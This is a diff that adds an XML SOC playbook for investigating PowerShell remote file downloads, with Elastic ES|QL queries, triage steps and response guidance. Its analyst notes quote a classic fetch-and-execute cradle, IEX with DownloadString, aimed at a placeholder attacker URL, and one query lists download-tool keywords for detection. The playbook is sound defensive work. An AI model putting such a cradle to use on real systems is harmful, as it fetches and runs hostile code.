@@ -1,0 +1,151 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Playbook xmlns="https://soc.example/playbooks" id="PB-WIN-050" name="Windows — Remote File Download via PowerShell - SOC Playbook" version="1.0" status="Production" classification="TLP:AMBER">
+  <Metadata>
+    <Owner>JCB Detection Engineering (WatchWave)</Owner>
+    <LastUpdated>2026-08-14</LastUpdated>
+    <Severity default="High">High</Severity>
+    <Confidence default="Medium">Medium</Confidence>
+    <Category>Command and Control / Ingress Tool Transfer</Category>
+    <MitreAttack>
+      <Technique id="T1105" name="Ingress Tool Transfer"/>
+      <Tactic id="TA0011" name="Command and Control"/>
+    </MitreAttack>
+    <References>
+      <Reference title="MITRE ATT and CK" url="https://attack.mitre.org/techniques/T1105/"/>
+    </References>
+  </Metadata>
+  <ExecutiveSummary>
+    <Overview>PowerShell made a DNS lookup to a non-Microsoft domain and then downloaded a file within 30s - the download-cradle pattern used to fetch second-stage payloads. Triage question: is PowerShell fetching an attacker payload, or a legitimate script downloading a resource?</Overview>
+    <BusinessImpact>PowerShell download cradles (IEX DownloadString/DownloadFile) fetch and often directly execute attacker code.</BusinessImpact>
+  </ExecutiveSummary>
+  <Scope><Assets>
+    <AssetType>Windows servers and workstations (INTDOM domain)</AssetType>
+    <AssetType>Domain controllers</AssetType>
+  </Assets><LogSources>
+    <LogSource>Sysmon process + Windows Security - logs-windows.sysmon_operational-*,logs-system.security-*</LogSource>
+  </LogSources></Scope>
+  <Prerequisites><TelemetryRequirements>
+    <Requirement>Windows Security + Sysmon + PowerShell logs via Elastic Agent (verified live). Sysmon event.code 1=process(command_line/parent populated), 11=file, 13/12=registry(registry.path populated); process.code_signature NOT collected.</Requirement>
+  </TelemetryRequirements><DetectionSignals>
+    <Signal><Name>PowerShell download</Name><Details>PowerShell DNS to a non-Microsoft domain then a download within 30s.</Details></Signal>
+  </DetectionSignals></Prerequisites>
+  <Inputs>
+    <Input name="$hostname" description="Host that downloaded."/>
+    <Input name="$username" description="Account (user.name) if present."/>
+  </Inputs>
+  <Triage><ImmediateCapture>
+    <Item>Host: $hostname</Item>
+  </ImmediateCapture><InitialAssessment>
+    <Rule>Weigh the evidence story, not any single fact - see ClassificationGuidance.</Rule>
+  </InitialAssessment></Triage>
+  <Investigation>
+    <Goal>Determine whether the PowerShell download fetched an attacker payload or a legitimate resource.</Goal>
+    <Workflow>
+      <Step order="1" name="PowerShell download command and destination domain">
+        <Purpose>The command and target domain reveal a download cradle vs a legitimate fetch.</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="INV-01-PSDL-CMD">
+          <![CDATA[
+FROM logs-windows.sysmon_operational-*,logs-system.security-*
+| WHERE event.code IN ("1","4688") AND host.name == "$hostname" AND process.name RLIKE "(?i)(powershell|pwsh|powershell_ise).*" AND process.command_line IS NOT NULL AND @timestamp >= NOW() - 4 hours
+| EVAL cl = TO_LOWER(process.command_line)
+| WHERE cl LIKE "*downloadstring*" OR cl LIKE "*downloadfile*" OR cl LIKE "*invoke-webrequest*" OR cl LIKE "*iwr *" OR cl LIKE "*wget *" OR cl LIKE "*curl *" OR cl LIKE "*.downloaddata*"
+| KEEP @timestamp, process.parent.name, process.command_line, user.name
+| SORT @timestamp DESC
+| LIMIT 15
+          ]]>
+        </Query>
+        <ExpectedOutput>
+          <Field name="process.parent.name"/>
+          <Field name="process.command_line"/>
+          <Field name="user.name"/>
+        </ExpectedOutput>
+        <AnalystNotes>IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;') is a classic cradle. A raw IP/paste-site/unusual domain fetching code is malicious; an internal/vendor URL for a resource is likely benign. The IEX + download combination (execute-what-you-fetch) is the strongest signal.</AnalystNotes>
+      </Step>
+      <Step order="2" name="Did a new process/connection follow the download">
+        <Purpose>A new process or external connection right after the download indicates the payload ran.</Purpose>
+        <Query platform="Elastic" language="ES|QL" id="INV-02-PSDL-FOLLOWON" optional="true">
+          <![CDATA[
+FROM logs-windows.sysmon_operational-*
+| WHERE event.code == "3" AND host.name == "$hostname" AND @timestamp >= NOW() - 1 hours
+| STATS conns = COUNT(*), dests = COUNT_DISTINCT(destination.ip), dest_ports = VALUES(destination.port) BY process.name
+| SORT conns DESC
+| LIMIT 15
+          ]]>
+        </Query>
+        <ExpectedOutput>
+          <Field name="process.name"/>
+          <Field name="conns"/>
+          <Field name="dest_ports"/>
+        </ExpectedOutput>
+        <AnalystNotes>New outbound connections from PowerShell or a spawned process after the download support payload execution/C2 - escalate.</AnalystNotes>
+      </Step>
+      <Step order="3" name="Finalize classification">
+        <DecisionTree>
+          <Node><Condition>A PowerShell download cradle (IEX + DownloadString) from a suspicious domain/IP, especially with follow-on execution/connections.</Condition><Result>True Positive (Malicious Payload Download - IR)</Result></Node>
+          <Node><Condition>A legitimate script downloading a resource from an internal/vendor URL.</Condition><Result>False Positive</Result></Node>
+          <Node><Condition>PowerShell download with an unclear destination.</Condition><Result>Needs Escalation</Result></Node>
+        </DecisionTree>
+        <DocumentationChecklist>
+          <Item>Attach outputs of INV-01-PSDL-CMD, INV-02-PSDL-FOLLOWON to the case.</Item>
+        </DocumentationChecklist>
+      </Step>
+    </Workflow>
+  </Investigation>
+  <ClassificationGuidance>
+    <FalsePositive>
+      <Definition>A legitimate script/admin download.</Definition>
+      <Indicators>
+        <Item>Internal/vendor URL.</Item>
+        <Item>No IEX/execute-what-you-fetch.</Item>
+        <Item>Known script/admin.</Item>
+      </Indicators>
+      <SOCAction>
+        <Item>Verify the source; close as false_positive.</Item>
+      </SOCAction>
+    </FalsePositive>
+    <TruePositive>
+      <Definition>A PowerShell download cradle fetching attacker code.</Definition>
+      <Indicators>
+        <Item>IEX + DownloadString.</Item>
+        <Item>Suspicious domain/IP.</Item>
+        <Item>Follow-on execution/C2.</Item>
+      </Indicators>
+      <SOCAction>
+        <Item>Isolate the host; capture the fetched payload; open IR.</Item>
+        <Item>Block the domain/IP; hunt the same cradle estate-wide.</Item>
+      </SOCAction>
+    </TruePositive>
+    <Misconfiguration>
+      <Definition>A deployment script using PowerShell downloads by design.</Definition>
+      <Indicators>
+        <Item>A known deployment script.</Item>
+        <Item>Benign internal source.</Item>
+      </Indicators>
+      <SOCAction>
+        <Item>Baseline; document.</Item>
+      </SOCAction>
+    </Misconfiguration>
+  </ClassificationGuidance>
+  <Response><IRForHumans>
+    <Phase name="Immediate Actions (0-30 minutes)">
+      <Action priority="1">Confirm the activity on the host; if malicious indicators, isolate the host.</Action>
+      <Action priority="2">Identify the responsible account/process and its origin.</Action>
+    </Phase>
+    <Phase name="Containment and Eradication (hours)">
+      <Action>Isolate the host; capture volatile evidence; hunt the same pattern across the estate.</Action>
+      <Action>Reset credentials used on the host if compromise is confirmed.</Action>
+    </Phase>
+    <Phase name="Recovery and Hardening (days)">
+      <Action>Remediate the root cause; add/verify EDR coverage; apply relevant hardening.</Action>
+    </Phase>
+  </IRForHumans></Response>
+  <QualityChecks>
+    <Check>Confirm the required telemetry (Sysmon/Security auditing) is present on the host.</Check>
+    <Check>Tune known-benign administrative sources via exceptions, not by disabling the rule.</Check>
+  </QualityChecks>
+  <ClosureCriteria><FalsePositiveClosure>
+    <Item>Activity confirmed benign/authorised and documented.</Item>
+  </FalsePositiveClosure><TruePositiveClosure>
+    <Item>Host contained and triaged; root cause eradicated; estate swept; findings recorded.</Item>
+  </TruePositiveClosure></ClosureCriteria>
+</Playbook>
